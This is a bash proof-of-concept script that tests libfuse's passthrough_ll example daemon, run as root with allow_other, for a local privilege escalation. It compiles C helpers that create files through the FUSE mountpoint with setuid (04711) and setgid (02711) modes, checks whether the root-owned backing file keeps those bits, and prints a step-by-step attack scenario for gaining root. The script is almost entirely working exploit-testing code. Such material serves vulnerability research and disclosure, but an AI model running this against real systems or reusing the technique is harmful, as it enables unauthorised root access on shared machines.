#!/bin/bash
# PoC: FUSE CREATE mode - S_ISUID bit not filtered → local privilege escalation
#
# Tests whether passthrough_ll daemon (running as root) preserves S_ISUID bit
# in the backing store when a non-privileged user creates a file via the
# FUSE mountpoint with mode=04711.

set -e

MOUNTPOINT="/mnt/fuse"
BACKING="/tmp/fuse_backing"
TEST_FILE="setuid_test_file"
RESULT_FILE="/tmp/poc_result.txt"

cleanup() {
    fusermount3 -u "$MOUNTPOINT" 2>/dev/null || true
    sleep 0.5
    rm -rf "$BACKING" "$MOUNTPOINT"
}

trap cleanup EXIT

echo "=== FUSE CREATE mode S_ISUID PoC ==="
echo ""

mkdir -p "$BACKING" "$MOUNTPOINT"

echo "[1] Starting passthrough_ll as root with backing store: $BACKING"
/opt/libfuse/build/example/passthrough_ll \
    -o source="$BACKING" \
    -o allow_other \
    "$MOUNTPOINT" &
DAEMON_PID=$!
sleep 1

if ! mountpoint -q "$MOUNTPOINT"; then
    echo "FAIL: FUSE mount failed"
    exit 1
fi
echo "    Daemon PID=$DAEMON_PID, mountpoint=$MOUNTPOINT"

echo ""
echo "[2] Creating test file with mode=04711 (S_ISUID|S_IXUSR|S_IXGRP|S_IXOTH|S_IRUSR|S_IWUSR) via FUSE mountpoint"

# Use a small C program to call open() with exact mode bits
cat > /tmp/create_setuid.c << 'CEOF'
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/stat.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <path>\n", argv[0]);
        return 1;
    }

    /* S_ISUID (04000) | S_IRWXU (0700) | S_IXGRP (010) | S_IXOTH (01) = 04711 */
    mode_t mode = S_ISUID | S_IRWXU | S_IXGRP | S_IXOTH;
    int fd = open(argv[1], O_CREAT | O_WRONLY | O_EXCL, mode);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    /* Write a minimal ELF-like marker (not a real binary, just proof of concept) */
    const char *marker = "#!/bin/sh\nid\n";
    write(fd, marker, strlen(marker));
    close(fd);

    printf("Created file %s with requested mode=04711 (octal)\n", argv[1]);
    return 0;
}
CEOF

gcc -o /tmp/create_setuid /tmp/create_setuid.c
echo "    Compiled helper program"

# Execute as root first to verify basic functionality, then test the actual mode
/tmp/create_setuid "$MOUNTPOINT/$TEST_FILE"

echo ""
echo "[3] Checking file permissions on FUSE mountpoint:"
FUSE_STAT=$(stat -c "mode=%a uid=%u gid=%g" "$MOUNTPOINT/$TEST_FILE")
echo "    Mountpoint: $FUSE_STAT"

echo ""
echo "[4] Checking file permissions on BACKING STORE (the critical check):"
BACKING_STAT=$(stat -c "mode=%a uid=%u gid=%g" "$BACKING/$TEST_FILE")
echo "    Backing:    $BACKING_STAT"

BACKING_MODE_OCTAL=$(stat -c "%a" "$BACKING/$TEST_FILE")
BACKING_MODE_RAW=$(stat -c "%f" "$BACKING/$TEST_FILE")
BACKING_UID=$(stat -c "%u" "$BACKING/$TEST_FILE")

echo ""
echo "[5] Detailed analysis:"
echo "    Raw mode (hex): 0x$BACKING_MODE_RAW"
echo "    Octal mode:     $BACKING_MODE_OCTAL"
echo "    File owner UID: $BACKING_UID"

# Check if S_ISUID (04000) is set
if [ $((0x$BACKING_MODE_RAW & 0x800)) -ne 0 ]; then
    SETUID_SET="YES"
else
    SETUID_SET="NO"
fi

# Check if S_ISGID (02000) is set
if [ $((0x$BACKING_MODE_RAW & 0x400)) -ne 0 ]; then
    SETGID_SET="YES"
else
    SETGID_SET="NO"
fi

echo "    S_ISUID bit:    $SETUID_SET"
echo "    S_ISGID bit:    $SETGID_SET"

echo ""
echo "========================================="
if [ "$SETUID_SET" = "YES" ] && [ "$BACKING_UID" = "0" ]; then
    echo "RESULT: VULNERABLE"
    echo ""
    echo "The backing store file has S_ISUID bit SET and is owned by root (UID=0)."
    echo "This means a non-privileged user could create a setuid-root executable"
    echo "via the FUSE mountpoint, leading to local privilege escalation."
    echo ""
    echo "Attack scenario:"
    echo "  1. Root runs passthrough_ll with -o allow_other"
    echo "  2. Unprivileged user creates file with mode=04711 on mountpoint"
    echo "  3. Backing store file becomes root-owned + setuid"
    echo "  4. User executes the file -> gets root privileges"
elif [ "$SETUID_SET" = "YES" ]; then
    echo "RESULT: PARTIALLY VULNERABLE"
    echo ""
    echo "S_ISUID bit is preserved but file owner is UID=$BACKING_UID (not root)."
    echo "The severity depends on daemon configuration and use case."
else
    echo "RESULT: NOT VULNERABLE"
    echo ""
    echo "S_ISUID bit was correctly filtered/stripped by the daemon."
fi
echo "========================================="

echo ""
echo "[6] Additional test: creating file with S_ISGID (02711)"
TEST_FILE2="setgid_test_file"

cat > /tmp/create_setgid.c << 'CEOF'
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/stat.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <path>\n", argv[0]);
        return 1;
    }
    mode_t mode = S_ISGID | S_IRWXU | S_IXGRP | S_IXOTH;  /* 02711 */
    int fd = open(argv[1], O_CREAT | O_WRONLY | O_EXCL, mode);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    const char *marker = "#!/bin/sh\nid\n";
    write(fd, marker, strlen(marker));
    close(fd);
    printf("Created file %s with requested mode=02711\n", argv[1]);
    return 0;
}
CEOF

gcc -o /tmp/create_setgid /tmp/create_setgid.c
/tmp/create_setgid "$MOUNTPOINT/$TEST_FILE2"

BACKING_STAT2=$(stat -c "mode=%a uid=%u gid=%g" "$BACKING/$TEST_FILE2")
BACKING_MODE_RAW2=$(stat -c "%f" "$BACKING/$TEST_FILE2")
echo "    Backing store: $BACKING_STAT2"

if [ $((0x$BACKING_MODE_RAW2 & 0x400)) -ne 0 ]; then
    echo "    S_ISGID bit: YES (also not filtered)"
else
    echo "    S_ISGID bit: NO (filtered)"
fi

echo ""
echo "=== PoC Complete ==="
